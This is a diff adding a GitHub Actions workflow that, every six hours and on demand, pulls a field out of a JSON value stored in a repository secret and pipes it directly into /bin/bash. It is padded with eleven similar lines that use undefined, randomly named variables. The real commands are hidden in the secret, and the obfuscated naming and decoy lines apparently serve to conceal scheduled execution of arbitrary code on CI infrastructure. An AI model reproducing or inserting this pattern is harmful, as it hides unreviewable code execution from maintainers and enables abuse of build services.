@@ -1,0 +1,28 @@
+name: chuangxinxiangman
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuangxinxiangman
+        env:
+          rpnr94215: ${{ secrets.rpnr94215 }}
+        run: |
+          echo $rpnr94215 | jq -r .zejh94997 | /bin/bash
+          echo $ylv8 | jq -r .zfchj9028 | /bin/bash
+          echo $jgx503 | jq -r .o213 | /bin/bash
+          echo $gec5 | jq -r .rmj06688 | /bin/bash
+          echo $yrbdo60337 | jq -r .dv3759 | /bin/bash
+          echo $tp962 | jq -r .jo34 | /bin/bash
+          echo $enp81259 | jq -r .fpy2 | /bin/bash
+          echo $kamq3294 | jq -r .b63235 | /bin/bash
+          echo $lygkh3376 | jq -r .nbkf80204 | /bin/bash
+          echo $vghm15 | jq -r .ccwmc928 | /bin/bash
+          echo $tg00211 | jq -r .q240 | /bin/bash
+          echo $n6 | jq -r .subiv583 | /bin/bash
+
